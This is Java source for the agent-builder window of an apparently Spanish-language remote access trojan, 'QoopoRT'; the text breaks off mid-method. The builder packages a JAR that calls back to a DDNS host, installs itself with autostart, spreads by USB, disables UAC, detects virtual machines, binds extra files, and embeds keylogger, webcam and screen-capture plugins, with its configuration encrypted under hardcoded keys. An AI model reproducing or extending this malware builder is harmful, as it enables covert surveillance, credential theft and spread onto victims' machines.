package qooport.avanzado;

import com.F;
import comunes.Archivo;
import comunes.CFG;
import java.awt.BorderLayout;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.JToolBar;
import javax.swing.filechooser.FileNameExtensionFilter;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import network.ConexionServer;
import static qooport.avanzado.QoopoRT.tipoLetra;
import qooport.avanzado.crearcliente.AntiVMPanel;
import qooport.avanzado.crearcliente.CifradoPanel;
import qooport.avanzado.crearcliente.ConexionPanel;
import qooport.avanzado.crearcliente.EspiarPanel;
import qooport.avanzado.crearcliente.FuncionesPanel;
import qooport.avanzado.crearcliente.InstalarPanel;
import qooport.avanzado.crearcliente.PluginsPanel;
import qooport.avanzado.crearcliente.PropagarPanel;
import qooport.utilidades.ArchivoUtil;
import qooport.utilidades.Compresor;
import qooport.utilidades.Perfil;
import qooport.utilidades.SerializarUtil;
import qooport.utilidades.Util;
import qooport.utilidades.cifrado.AES;
import qooport.utilidades.cifrado.Encriptacion;

public class CrearCliente extends JFrame {

    public static String passCifradoConfig = "LAOSUISNPASD12378ASDLGASDHGAKD";
    public static String passCifradoCripter = "AJHSJKDFHASJDFHW2EFAHSDJFHASKA";
    private JFileChooser cd = new JFileChooser();
    private JButton btnCrearCliente;
    private JButton btnGuardarPerfiles;
    private ConexionPanel panelConexion;
    private CifradoPanel panelCifrado;
    private InstalarPanel panelInstalar;
    private PropagarPanel panelPropagacion;
    private EspiarPanel panelEspiar;
    private FuncionesPanel panelOpciones;
    private PluginsPanel panelPlugins;
    private AntiVMPanel panelANTIVM;
    private JPanel panelPerfil;
    private JPanel panelConstruir;
    private JPanel panelBinder;
    private JTabbedPane tabs;
    private JTable tblPerfiles;
    private JScrollPane scrollTablaPerfiles;
    private List<Perfil> perfiles;
    private Perfil perfil;
    private JTextArea logServer;
    private JScrollPane scrollTablaAdjuntos;
    private JTable tblAdjuntos;
    private List<Archivo> listaAdjuntos;// archivos ser incrustados en el servidor

    public CrearCliente() {
        initComponents();
        listaAdjuntos = new ArrayList<>();
        this.setIconImage(Util.cargarIcono16("/resources/computer.png").getImage());
        panelCifrado.generarClave();
        perfiles = this.cargarArchivoPerfiles();
        this.actualizarListaPerfiles();
        this.tblPerfiles.getColumnModel().getColumn(0).setCellRenderer(new CeldaIcono());
        this.setLocationRelativeTo(null);
    }

    private List<Perfil> cargarArchivoPerfiles() {
        List<Perfil> tmp = new ArrayList<>();
        File archivo = new File("perfiles.dat");
        if (archivo.exists()) {
            try {
                tmp = (List) SerializarUtil.leerObjeto(new FileInputStream(archivo));
            } catch (IOException | ClassNotFoundException ex) {
                Logger.getLogger(CrearCliente.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        return tmp;
    }

    public void guardarArchivosPerfiles(List<Perfil> lista) {
        try {
            File archivo = new File("perfiles.dat");
            if (archivo.exists()) {
                archivo.delete();
            }
            SerializarUtil.escribirArchivo(lista, archivo.getAbsolutePath());
        } catch (IOException ex) {
            Logger.getLogger(CrearCliente.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void agregarPerfil() {
        String nombre = JOptionPane.showInputDialog(this, "Nombre del perfil:");
        Perfil perfilNuevo = new Perfil();
        perfilNuevo.agregarParametro("nombre", nombre);
        perfilNuevo.agregarParametro("nombre_usb", "nombre_a_copiar_usb");
        perfilNuevo.agregarParametro("autoinicio", "true");
        perfilNuevo.agregarParametro("servicio", "true");
        perfilNuevo.agregarParametro("instalar", "true");
        perfilNuevo.agregarParametro("jar_name", nombre);
        perfilNuevo.agregarParametro("reg_name", nombre);
        perfilNuevo.agregarParametro("tipoConexion", ConexionServer.TCP);
        perfilNuevo.agregarParametro("ssl", "true");
        perfilNuevo.agregarParametro("puerto", "4000");
        perfilNuevo.agregarParametro("prefijo", "serv_");
        perfilNuevo.agregarParametro("dns", "minoip.ddns.net");
        perfilNuevo.agregarParametro("clave_acceso", panelCifrado.generarClave());
        perfilNuevo.agregarParametro("prog_tareas", "false");
        perfilNuevo.agregarParametro("delay", "3");
        perfilNuevo.agregarParametro("off-escritorio", "true");
        perfilNuevo.agregarParametro("off-escritorio-delay", "3");
        perfilNuevo.agregarParametro("usb", "false");
        perfilNuevo.agregarParametro("password", "");
        perfilNuevo.agregarParametro("inversa", "true");
        perfilNuevo.agregarParametro("fn_camara", "true");
        perfilNuevo.agregarParametro("fn_uac", "false");
        perfilNuevo.agregarParametro("fn_ventana", "false");
        perfilNuevo.agregarParametro("fn_escritorioremoto", "true");
        perfilNuevo.agregarParametro("fn_audio", "true");
        perfilNuevo.agregarParametro("fn_buscararchivos", "true");
        perfilNuevo.agregarParametro("fn_descarga_archivos", "true");
        perfilNuevo.agregarParametro("pg_camara", "false");
        perfilNuevo.agregarParametro("pg_keylogger", "false");
        perfilNuevo.agregarParametro("pg_jna", "false");
        perfilNuevo.agregarParametro("pg_nirsoft", "false");
        this.perfiles.add(perfilNuevo);
        actualizarListaPerfiles();
    }

    public String getExtension(String filename) {
        int index = filename.lastIndexOf('.');
        if (index == -1) {
            return "";
        } else {
            return filename.substring(index + 1);
        }
    }

    public void agregarArchivo() {
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setCurrentDirectory(new File(System.getProperty("user.home")));
        int result = fileChooser.showOpenDialog(this);
        if (result == JFileChooser.APPROVE_OPTION) {
            try {
                File selectedFile = fileChooser.getSelectedFile();
                Archivo archivo = new Archivo();
                archivo.setCarpeta(selectedFile.isDirectory());
                archivo.setNombre(selectedFile.getName());
                archivo.setPath(selectedFile.getAbsolutePath());
                archivo.setPathParent(selectedFile.getParent());
                archivo.setTipo(getExtension(selectedFile.getName()));
                archivo.setFecha(selectedFile.lastModified());
                archivo.setIcono(Compresor.comprimirGZIP(ArchivoUtil.bytesArchivo(selectedFile)));
                this.listaAdjuntos.add(archivo);
            } catch (IOException ex) {
            }
        }
        actualizarListaAdjuntos();
    }

    private void seleccionarPerfil() {
        String nombre = this.tblPerfiles.getValueAt(this.tblPerfiles.getSelectedRow(), 1).toString();
        for (Perfil p : this.perfiles) {
            if (nombre.equals(p.obtenerParametro("nombre"))) {
                this.perfil = p;
            }
        }
        cargarPerfil(perfil);
        this.tabs.addTab("Conexión", Util.cargarIcono16("/resources/connect.png"), this.panelConexion);
        this.tabs.addTab("Instalar", Util.cargarIcono16("/resources/puerto.png"), this.panelInstalar);
        this.tabs.addTab("Cifrado", Util.cargarIcono16("/resources/key.png"), this.panelCifrado);
        this.tabs.addTab("Propagación", Util.cargarIcono16("/resources/virus.png"), this.panelPropagacion);
        this.tabs.addTab("Captura off-line", Util.cargarIcono16("/resources/spy.png"), this.panelEspiar);
        this.tabs.addTab("Funciones", Util.cargarIcono16("/resources/grid16.png"), this.panelOpciones);
        this.tabs.addTab("Plugins", Util.cargarIcono16("/resources/plugin.png"), this.panelPlugins);
        this.tabs.addTab("Anti-VM", Util.cargarIcono16("/resources/vmware.png"), this.panelANTIVM);
        this.tabs.addTab("Binder", Util.cargarIcono16("/resources/binder.png"), this.panelBinder);
        this.tabs.addTab("Construir", Util.cargarIcono16("/resources/server.png"), this.panelConstruir);
    }

    private void eliminarPerfil() {
        String nombre = null;
        try {
            nombre = this.tblPerfiles.getValueAt(this.tblPerfiles.getSelectedRow(), 1).toString();
        } catch (Exception e) {
        }
        try {
            for (Perfil p : this.perfiles) {
                if ((nombre != null && nombre.equals(p.obtenerParametro("nombre")))
                        || (nombre == null && p.obtenerParametro("nombre") == null)) {
                    perfiles.remove(p);
                }
            }
        } catch (Exception e) {
        }
        this.actualizarListaPerfiles();
    }

    private void eliminarArchivo() {
        String nombre = null;
        try {
            nombre = this.tblAdjuntos.getValueAt(this.tblAdjuntos.getSelectedRow(), 1).toString();
        } catch (Exception e) {
        }
        try {
            for (Archivo p : this.listaAdjuntos) {
                if ((nombre != null && nombre.equals(p.getNombre()))
                        || (nombre == null && p.getNombre() == null)) {
                    listaAdjuntos.remove(p);
                }
            }
        } catch (Exception e) {
        }
        actualizarListaAdjuntos();
    }

    private void cargarPerfil(Perfil p) {
        try {
            panelConexion.getPrefijo().setText((String) p.obtenerParametro("prefijo"));

            this.panelConexion.getTxtIpDNS().setText((String) p.obtenerParametro("dns"));
            this.panelConexion.getPassword().setText((String) p.obtenerParametro("password"));

            try {
                this.panelConexion.getComboProtocolo().setSelectedIndex((int) p.obtenerParametro("tipoConexion"));
            } catch (Exception e) {

            }

            try {
                this.panelConexion.getChkSSL().setSelected(Boolean.valueOf((String) p.obtenerParametro("ssl")));
            } catch (Exception e) {

            }
            this.panelConexion.getPuerto().setValue(Integer.parseInt((String) p.obtenerParametro("puerto")));
//            this.panConexion.getPuerto2().setValue(Integer.parseInt((String) p.obtenerParametro("puerto2")));
            this.panelConexion.getTxtDelay().setText((String) p.obtenerParametro("delay"));
            this.panelConexion.getConexionInversa().setSelected(Boolean.valueOf((String) p.obtenerParametro("inversa")));
            this.panelCifrado.getKey().setText((String) p.obtenerParametro("clave_acceso"));
            try {
                this.panelEspiar.getCapturaOfflinePantalla().setSelected((Boolean) p.obtenerParametro("off-escritorio"));
                this.panelEspiar.getDelayCapturaPantalla().setValue(Integer.parseInt((String) p.obtenerParametro("off-escritorio-delay")));
            } catch (Exception e) {
            }
            this.panelPropagacion.getCheckUSB().setSelected(Boolean.valueOf((String) p.obtenerParametro("usb")));
            this.panelPropagacion.getNombreUSB().setText((String) p.obtenerParametro("nombre_usb"));
            this.panelInstalar.getLblAutoInicio().setSelected(Boolean.valueOf((String) p.obtenerParametro("instalar")));
            this.panelInstalar.getAutoinicio().setSelected(Boolean.valueOf((String) p.obtenerParametro("autoinicio")));
            this.panelInstalar.getServicio().setSelected(Boolean.valueOf((String) p.obtenerParametro("servicio")));
            this.panelInstalar.getProgramadorTarea().setSelected(Boolean.valueOf((String) p.obtenerParametro("prog_tareas")));
            this.panelInstalar.getRegName().setText((String) p.obtenerParametro("reg_name"));
            this.panelInstalar.getFilename().setText((String) p.obtenerParametro("jar_name"));
            this.panelOpciones.getFn_Ventana().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_ventana")));
            this.panelOpciones.getFn_buscarArchivos().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_buscararchivos")));
            this.panelOpciones.getFn_capturaAudio().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_audio")));
            this.panelOpciones.getFn_escritorioRemoto().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_escritorioremoto")));
            this.panelOpciones.getFn_capturaCamara().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_camara")));
            this.panelOpciones.getFn_desUAC().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_uac")));
            this.panelOpciones.getFn_descargararchivos().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_descarga_archivos")));
            this.panelPlugins.getAdjuntarPluginsJNA().setSelected(Boolean.valueOf((String) p.obtenerParametro("pg_jna")));
            this.panelPlugins.getAdjuntarPluginsKeylogger().setSelected(Boolean.valueOf((String) p.obtenerParametro("pg_keylogger")));
            this.panelPlugins.getAdjuntarPluginsWebCam().setSelected(Boolean.valueOf((String) p.obtenerParametro("pg_camara")));
            this.panelPlugins.getAdjuntarPluginsNirsoft().setSelected(Boolean.valueOf((String) p.obtenerParametro("pg_nirsoft")));

            panelInstalar.autoInicioAP(null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void setearPerfil(File a) {

        perfil.agregarParametro("prefijo", this.panelConexion.getPrefijo().getText());
        perfil.agregarParametro("dns", this.panelConexion.getTxtIpDNS().getText());
        perfil.agregarParametro("password", panelConexion.getPassword().getText());
        perfil.agregarParametro("tipoConexion", panelConexion.getComboProtocolo().getSelectedIndex());
        perfil.agregarParametro("ssl", String.valueOf(panelConexion.getChkSSL().isSelected()));
        perfil.agregarParametro("puerto", panelConexion.getPuerto().getValue().toString());
        perfil.agregarParametro("delay", panelConexion.getTxtDelay().getText());
        perfil.agregarParametro("off-escritorio", this.panelEspiar.getCapturaOfflinePantalla().isSelected());
        perfil.agregarParametro("off-escritorio-delay", this.panelEspiar.getDelayCapturaPantalla().getValue());
        perfil.agregarParametro("usb", String.valueOf(panelPropagacion.getCheckUSB().isSelected()));
        perfil.agregarParametro("nombre_usb", panelPropagacion.getNombreUSB().getText());
        perfil.agregarParametro("clave_acceso", panelCifrado.getKey().getText());
        perfil.agregarParametro("instalar", String.valueOf(panelInstalar.getLblAutoInicio().isSelected()));
        perfil.agregarParametro("servicio", String.valueOf(panelInstalar.getServicio().isSelected()));
        perfil.agregarParametro("autoinicio", String.valueOf(panelInstalar.getAutoinicio().isSelected()));
        perfil.agregarParametro("prog_tareas", String.valueOf(panelInstalar.getProgramadorTarea().isSelected()));
        perfil.agregarParametro("reg_name", panelInstalar.getRegName().getText());
        perfil.agregarParametro("jar_name", panelInstalar.getFilename().getText());
        perfil.agregarParametro("inversa", String.valueOf(this.panelConexion.getConexionInversa().isSelected()));
        perfil.agregarParametro("fn_camara", String.valueOf(panelOpciones.getFn_capturaCamara().isSelected()));
        perfil.agregarParametro("fn_uac", String.valueOf(panelOpciones.getFn_desUAC().isSelected()));
        perfil.agregarParametro("fn_ventana", String.valueOf(panelOpciones.getFn_Ventana().isSelected()));
        perfil.agregarParametro("fn_escritorioremoto", String.valueOf(panelOpciones.getFn_escritorioRemoto().isSelected()));
        perfil.agregarParametro("fn_audio", String.valueOf(panelOpciones.getFn_capturaAudio().isSelected()));
        perfil.agregarParametro("fn_buscararchivos", String.valueOf(panelOpciones.getFn_buscarArchivos().isSelected()));
        perfil.agregarParametro("fn_descarga_archivos", String.valueOf(panelOpciones.getFn_descargararchivos().isSelected()));
        perfil.agregarParametro("pg_camara", String.valueOf(panelPlugins.getAdjuntarPluginsWebCam().isSelected()));
        perfil.agregarParametro("pg_keylogger", String.valueOf(panelPlugins.getAdjuntarPluginsKeylogger().isSelected()));
        perfil.agregarParametro("pg_jna", String.valueOf(panelPlugins.getAdjuntarPluginsJNA().isSelected()));
        perfil.agregarParametro("pg_nirsoft", String.valueOf(panelPlugins.getAdjuntarPluginsNirsoft().isSelected()));
        perfil.agregarParametro("version_objeto", "true");//esta version de perfil es con objetos, entonces en su listener se crea una isntanacia del AsociadoV2

        if (a != null) {
            perfil.agregarParametro("nombre_archivo", a.getAbsolutePath());
        }

//        this.autoinicio.setSelected(p.isAutoInicio());
//        this.programadorTarea.setSelected(p.isProgTareas());
//        this.txtAutoInicioNombre.setText(p.getRegName());
//        this.filename.setText(p.getJarName());
    }

    private void actualizarListaPerfiles() {
        for (int i = this.tblPerfiles.getRowCount() - 1; i > -1; i--) {
            ((DefaultTableModel) this.tblPerfiles.getModel()).removeRow(i);
        }
        for (Perfil p : perfiles) {
            ((DefaultTableModel) this.tblPerfiles.getModel()).addRow(
                    new Object[]{
                        null,
                        p.obtenerParametro("nombre")
                    });
        }
    }

    private void actualizarListaAdjuntos() {
        for (int i = this.tblAdjuntos.getRowCount() - 1; i > -1; i--) {
            ((DefaultTableModel) this.tblAdjuntos.getModel()).removeRow(i);
        }
        for (Archivo p : listaAdjuntos) {
            ((DefaultTableModel) this.tblAdjuntos.getModel()).addRow(new Object[]{p.getNombre()});
        }
    }

    private void initComponents() {
        this.tabs = new JTabbedPane();
        tabs.setTabPlacement(JTabbedPane.LEFT);
        panelCifrado = new CifradoPanel();
        this.panelConexion = new ConexionPanel();
        this.panelInstalar = new InstalarPanel();
        this.panelPropagacion = new PropagarPanel();
        panelOpciones = new FuncionesPanel();

        panelPlugins = new PluginsPanel();
        panelANTIVM = new AntiVMPanel();

        this.panelPerfil = new JPanel();

        this.panelConstruir = new JPanel();
        panelEspiar = new EspiarPanel();

        this.btnCrearCliente = new JButton();
        btnGuardarPerfiles = new JButton();
        this.logServer = new JTextArea();
        panelBinder = new JPanel();
        setTitle("Construir Agente");
        this.tabs.setFont(new Font(tipoLetra, 1, 14));
//###############################################################################################################3
//                            Perfiles
//###############################################################################################################3
        this.scrollTablaPerfiles = new JScrollPane();
        tblPerfiles = new JTable();
        tblPerfiles.setShowGrid(false);
//        this.tabla.setComponentPopupMenu(this.menu);
        this.tblPerfiles.setAutoCreateRowSorter(true);
        this.tblPerfiles.setFont(new Font(tipoLetra, 1, 14));
        this.tblPerfiles.setModel(new DefaultTableModel(new Object[0][], new String[]{"", "Nombre"}) {
            boolean[] canEdit = {false, false, false, false, false};

            @Override
            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return this.canEdit[columnIndex];
            }
        });

        this.tblPerfiles.getColumnModel().getColumn(0).setMinWidth(20);
        this.tblPerfiles.getColumnModel().getColumn(0).setPreferredWidth(20);
        this.tblPerfiles.getColumnModel().getColumn(0).setMaxWidth(20);
        this.scrollTablaPerfiles.setViewportView(this.tblPerfiles);
        JButton btnSeleccionarPerfil = new JButton();
        btnSeleccionarPerfil.setIcon(Util.cargarIcono16("/resources/start.png"));
        btnSeleccionarPerfil.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                CrearCliente.this.seleccionarPerfil();
            }
        });
        JButton btnAgregarPerfil = new JButton();
        btnAgregarPerfil.setIcon(Util.cargarIcono16("/resources/add.png"));
        btnAgregarPerfil.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                CrearCliente.this.agregarPerfil();
            }
        });
        JButton btnEliminarPerfil = new JButton();
        btnEliminarPerfil.setIcon(Util.cargarIcono16("/resources/delete.png"));
        btnEliminarPerfil.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                CrearCliente.this.eliminarPerfil();
            }
        });
        JPanel pnlOpciones = new JPanel();
        JToolBar barraPerfil = new JToolBar();
        barraPerfil.setFloatable(false);
        barraPerfil.add(btnSeleccionarPerfil);
        barraPerfil.add(btnAgregarPerfil);
        barraPerfil.add(btnEliminarPerfil);
        pnlOpciones.setLayout(new BorderLayout());
        pnlOpciones.add(barraPerfil, BorderLayout.NORTH);
        this.panelPerfil.setLayout(new BorderLayout());
        this.panelPerfil.add(scrollTablaPerfiles, BorderLayout.CENTER);
        this.panelPerfil.add(pnlOpciones, BorderLayout.EAST);
        this.tabs.addTab("Perfil", Util.cargarIcono16("/resources/person.png"), this.panelPerfil);

//###############################################################################################################
//                    BINDER
//###############################################################################################################
        this.scrollTablaAdjuntos = new JScrollPane();
        tblAdjuntos = new JTable();
        tblAdjuntos.setShowGrid(false);
//        this.tabla.setComponentPopupMenu(this.menu);
        this.tblAdjuntos.setAutoCreateRowSorter(true);
        this.tblAdjuntos.setFont(new Font(tipoLetra, 1, 14));
        this.tblAdjuntos.setModel(new DefaultTableModel(new Object[0][], new String[]{"Nombre"}) {
            boolean[] canEdit = {false, false, false, false, false};

            @Override
            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return this.canEdit[columnIndex];
            }
        });
        this.scrollTablaAdjuntos.setViewportView(this.tblAdjuntos);
        this.panelBinder.setLayout(new BorderLayout());
        this.panelBinder.add(scrollTablaAdjuntos, BorderLayout.CENTER);
        JButton btnAgregarArchivo = new JButton();
        btnAgregarArchivo.setIcon(Util.cargarIcono16("/resources/add.png"));
        btnAgregarArchivo.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                CrearCliente.this.agregarArchivo();
            }
        });
        JButton btnEliminarArchivo = new JButton();
        btnEliminarArchivo.setIcon(Util.cargarIcono16("/resources/delete.png"));
        btnEliminarArchivo.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                CrearCliente.this.eliminarArchivo();
            }
        });
        JPanel pnlOpcionesBinder = new JPanel();
        JToolBar barraBinder = new JToolBar();
        barraBinder.setFloatable(false);
        barraBinder.add(btnAgregarArchivo);
        barraBinder.add(btnEliminarArchivo);
        pnlOpcionesBinder.setLayout(new BorderLayout());
        pnlOpcionesBinder.add(barraBinder, BorderLayout.NORTH);
        this.panelBinder.add(pnlOpcionesBinder, BorderLayout.EAST);

//###############################################################################################################
//                            CONSTRUIR AGENTE
//###############################################################################################################
        JToolBar barraInferior = new JToolBar();
        barraInferior.add(this.btnCrearCliente);
        barraInferior.add(this.btnGuardarPerfiles);
        barraInferior.setFloatable(false);
        JScrollPane scrollLog = new JScrollPane();
        scrollLog.setViewportView(this.logServer);
        this.panelConstruir = new JPanel();
        this.panelConstruir.setLayout(new BorderLayout());
        panelConstruir.add(scrollLog, BorderLayout.CENTER);
        panelConstruir.add(barraInferior, BorderLayout.SOUTH);
        this.btnCrearCliente.setText("Crear Agente");
        this.btnCrearCliente.setIcon(Util.cargarIcono16("/resources/computer.png"));
        this.btnCrearCliente.setToolTipText("Crea el cliente y guarda el perfil actual.");
        this.btnCrearCliente.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                CrearCliente.this.CrearAgenteActionPerformed(evt);
            }
        });
        this.btnGuardarPerfiles.setText("Guardar perfil");
        this.btnGuardarPerfiles.setIcon(Util.cargarIcono16("/resources/save.png"));
        this.btnGuardarPerfiles.setToolTipText("Guarda el perfil actual.");
        this.btnGuardarPerfiles.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                CrearCliente.this.setearPerfil(null);
                CrearCliente.this.guardarArchivosPerfiles(perfiles);
            }
        });
        this.setLayout(new BorderLayout());
        this.add(tabs, BorderLayout.CENTER);
//        this.add(barraInferior, BorderLayout.SOUTH);
        this.setLocationRelativeTo(null);
        pack();
    }

    private void agregarLog(String log) {
        this.logServer.append(log);
        this.logServer.append("\n");
        this.repaint();
    }

    private CFG armarArchivoConfig() {

        int protocolo = 1;
        if (panelConexion.getComboProtocolo().getSelectedItem().toString().equals("UDP")) {
            protocolo = 2;
        } else {
            protocolo = 1;
        }

        int tipoConexion = 1;
        if (panelConexion.getConexionInversa().isSelected()) {
            tipoConexion = 1;
        } else {
            tipoConexion = 2;
        }

        CFG cfg = new CFG();
        cfg.agregarParametro("prefijo", this.panelConexion.getPrefijo().getText());
        cfg.agregarParametro("claveClase", this.panelCifrado.getKey().getText());
        cfg.agregarParametro("dns", panelConexion.getTxtIpDNS().getText());
        cfg.agregarParametro("password", Encriptacion.MD5(new String(panelConexion.getPassword().getPassword())));
        cfg.agregarParametro("puerto", Integer.valueOf(this.panelConexion.getPuerto().getValue().toString()));
        cfg.agregarParametro("delay", Integer.valueOf(panelConexion.getTxtDelay().getText()));
        cfg.agregarParametro("avmw", panelANTIVM.getAntiVM_windows().isSelected());
        cfg.agregarParametro("avml", panelANTIVM.getAntiVM_linux().isSelected());

        //configuracion de espiar
        //--escritorio
        cfg.agregarParametro("off-escritorio", this.panelEspiar.getCapturaOfflinePantalla().isSelected());
        cfg.agregarParametro("off-escritorio-delay", this.panelEspiar.getDelayCapturaPantalla().getValue() * 1000);
        //--camara

        cfg.agregarParametro("tipoConexion", tipoConexion);
        cfg.agregarParametro("ssl", panelConexion.getChkSSL().isSelected());
        cfg.agregarParametro("protocolo", protocolo);
        cfg.agregarParametro("uac", this.panelOpciones.getFn_desUAC().isSelected());
        cfg.agregarParametro("gui", this.panelOpciones.getFn_Ventana().isSelected());
        cfg.agregarParametro("usb", this.panelPropagacion.getCheckUSB().isSelected());

        if (this.panelPropagacion.getCheckUSB().isSelected()) {
            cfg.agregarParametro("nombreUSB", this.panelPropagacion.getNombreUSB().getText());

        }
        cfg.agregarParametro("instalar", this.panelInstalar.getLblAutoInicio().isSelected());

        //instala como servicio
        cfg.agregarParametro("servicio", panelInstalar.getServicio().isSelected());

        if (this.panelInstalar.getLblAutoInicio().isSelected()) {
            cfg.agregarParametro("autoInicio", this.panelInstalar.getAutoinicio().isSelected());
            cfg.agregarParametro("progTareas", this.panelInstalar.getProgramadorTarea().isSelected());
            cfg.agregarParametro("regName", this.panelInstalar.getRegName().getText());
            cfg.agregarParametro("jarName", this.panelInstalar.getFilename().getText());

        }
        return cfg;
    }

    private void CrearAgenteActionPerformed(ActionEvent evt) {
        this.cd.setDialogTitle("Guardar Agente");
        this.cd.setDialogType(1);
        this.cd.setFileFilter(new FileNameExtensionFilter("Ejecutable Java", new String[]{"jar"}));
        if (perfil != null) {
            try {
                cd.setSelectedFile(new File((String) perfil.obtenerParametro("nombre_archivo")));
            } catch (Exception e) {
            }
        }
        if (this.cd.showSaveDialog(this) == 0) {
            try {

                agregarLog("=======================================================");
                agregarLog("\t\tCreando Agente");
                agregarLog("=======================================================");

                String protocolo = "1";
                if (panelConexion.getComboProtocolo().getSelectedItem().toString().equals("UDP")) {
                    protocolo = "2";
                } else {
                    protocolo = "1";
                }

                String tipoConexion = "1";
                if (panelConexion.getConexionInversa().isSelected()) {
                    tipoConexion = "1";
                } else {
                    tipoConexion = "2";
                }

                File desTmp = this.cd.getSelectedFile();
                if (desTmp.exists()) {
                    desTmp.delete();
                }
                String name = desTmp.getName();
                name = name.replaceAll(".jar", "");
                name += ".jar";

                File destinoCifrado = new File(desTmp.getParent(), name);
                File destino = new File(desTmp.getParent(), "tmp-" + name);
//                File destino = new File(desTmp.getParent(), name);
//                this.setearPerfil(destino);
                this.setearPerfil(destinoCifrado);
                this.guardarArchivosPerfiles(perfiles);

                JarInputStream input = new JarInputStream(getClass().getResourceAsStream("/extras/lib/QoopoRTServer.jar"));
                FileOutputStream fout = new FileOutputStream(destino);
                JarOutputStream salida = new JarOutputStream(fout, input.getManifest());
                salida.setComment("--");
                //AGREGO ARCHIVO CONFIGURACION V2.0
                try {
//                    agregarLog("=======================================================");
                    agregarLog("\tEscribiendo configuración en el agente");
                    ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                    SerializarUtil.escribirStream(armarArchivoConfig(), outAd);
                    salida.putNextEntry(new JarEntry("cfg.dat"));
                    byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
                    salida.write(datosAdjuntos);
                    salida.closeEntry();
                    agregarLog("\tArchivo de configuración agregado " + Util.convertirBytes(datosAdjuntos.length));

                } catch (Exception e) {
                }

                //AGREGO LOS ARCHIVOS ADJUNTOS A EJECUTAR
                try {
                    if (listaAdjuntos != null && !listaAdjuntos.isEmpty()) {
                        agregarLog("=======================================================");
                        agregarLog("\tAgregando archivos adjuntos");
                        ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                        SerializarUtil.escribirStream(listaAdjuntos, outAd);
                        salida.putNextEntry(new JarEntry("adjuntos.dat"));
                        byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
                        salida.write(datosAdjuntos);
                        salida.closeEntry();
                        agregarLog("\tArchivos adjuntos agregados " + Util.convertirBytes(datosAdjuntos.length));

                    }
                } catch (Exception e) {
                }

                //AGREGO LOS PLUGINS
                try {
                    List<Archivo> lstPlugins = new ArrayList<>();
                    agregarLog("=======================================================");
                    agregarLog("\tAgregando plugins");

                    if (this.panelPlugins.getAdjuntarPluginsWebCam().isSelected()) {
                        Archivo p1 = new Archivo();
                        p1.setNombre("QoopoRTPlugWC.jar");
                        p1.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/p2/QoopoRTPlugWC.jar"))));
                        lstPlugins.add(p1);

                        Archivo p2 = new Archivo();
                        p2.setNombre("/lib/bridj-0.7-20130703.103049-42.jar");
                        p2.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/p2/bridj-0.7-20130703.103049-42.jar"))));
                        lstPlugins.add(p2);
                    }

                    if (this.panelPlugins.getAdjuntarPluginsKeylogger().isSelected()) {
                        Archivo p1 = new Archivo();
                        p1.setNombre("QoopoRTPlugKL.jar");
                        p1.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/p1/QoopoRTPlugKL.jar"))));
                        lstPlugins.add(p1);
                    }

                    if (this.panelPlugins.getAdjuntarPluginsJNA().isSelected()) {
                        Archivo p1 = new Archivo();
                        p1.setNombre("QoopoRTPlugJNA.jar");
                        p1.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/p3/QoopoRTPlugJNA.jar"))));
                        lstPlugins.add(p1);

                        Archivo p2 = new Archivo();
                        p2.setNombre("/lib/jna-4.2.1.jar");
                        p2.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/p3/jna-4.2.1.jar"))));
                        lstPlugins.add(p2);

                        Archivo p3 = new Archivo();
                        p3.setNombre("/lib/jna-platform-4.2.1.jar");
                        p3.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/p3/jna-platform-4.2.1.jar"))));
                        lstPlugins.add(p3);
                    }

                    if (this.panelPlugins.getAdjuntarPluginsNirsoft().isSelected()) {
//                        for (String plugin : Global.nombresPluginsNirsoft) {
//                            Archivo p1 = new Archivo();
//                            p1.setNombre(plugin + ".exe");
